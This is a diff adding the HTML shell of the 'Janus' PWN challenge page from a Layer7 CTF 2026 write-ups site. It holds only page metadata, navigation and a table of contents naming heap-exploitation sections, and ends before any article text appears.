@@ -1,0 +1,2040 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="English write-ups for Layer7 CTF 2026 (Jeopardy + KoTH) with captured evidence and verified flags.">
+      
+      
+        <meta name="author" content="B0TCIL">
+      
+      
+        <link rel="canonical" href="https://fijarsatria.github.io/layer7-ctf-2026-writeups/challenges/6-janus/">
+      
+      
+        <link rel="prev" href="../5-cartridge/">
+      
+      
+        <link rel="next" href="../7-dead-letter/">
+      
+      
+      <link rel="icon" href="../../assets/layer7.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Janus - Layer7 CTF 2026 — Write-ups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/layer7.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tldr" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Layer7 CTF 2026 — Write-ups" class="md-header__button md-logo" aria-label="Layer7 CTF 2026 — Write-ups" data-md-component="logo">
+      
+  <img src="../../assets/layer7.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Layer7 CTF 2026 — Write-ups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Janus
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="green"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="green"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Fijarsatria/layer7-ctf-2026-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Layer7 CTF 2026 — Write-ups" class="md-nav__button md-logo" aria-label="Layer7 CTF 2026 — Write-ups" data-md-component="logo">
+      
+  <img src="../../assets/layer7.svg" alt="logo">
+
+    </a>
+    Layer7 CTF 2026 — Write-ups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Fijarsatria/layer7-ctf-2026-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reproducibility/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reproducibility
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evidence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Evidence index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../koth/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    KoTH
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            KoTH
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Glasshouse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 1 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 2 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 3 — Glasshouse VM (Capability Confusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 4 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 5 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 6 — Glasshouse VM (Split Decoder)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    WEB
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            WEB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-pipecake/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pipecake
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-forgotten/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forgotten
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../22-roupang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Roupang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    PWN
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            PWN
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-whos-your-bias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    whos your bias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-cartridge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cartridge
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Janus
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Janus
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#core-bug-cross-thread-tcache-double-free" class="md-nav__link">
+    <span class="md-ellipsis">
+      Core bug: cross-thread tcache double-free
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leaks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Leaks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-libc-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote libc identification
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cross-thread-tcache-poisoning-in-detail" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cross-thread tcache poisoning in detail
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#platform-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      Platform submission
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captured-solver-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Captured solver transcript
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-dead-letter/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dead Letter
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    REV
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            REV
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14-mad-rabbit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mad rabbit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../17-false-friends/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    False Friends
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../20-prism-box/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prism Box
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-autoby/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Autoby
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    MISC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            MISC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-mic-check/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mic_check
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-human-top-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    human top 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#core-bug-cross-thread-tcache-double-free" class="md-nav__link">
+    <span class="md-ellipsis">
+      Core bug: cross-thread tcache double-free
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leaks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Leaks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-libc-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote libc identification
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cross-thread-tcache-poisoning-in-detail" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cross-thread tcache poisoning in detail
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#platform-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      Platform submission
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captured-solver-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Captured solver transcript
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
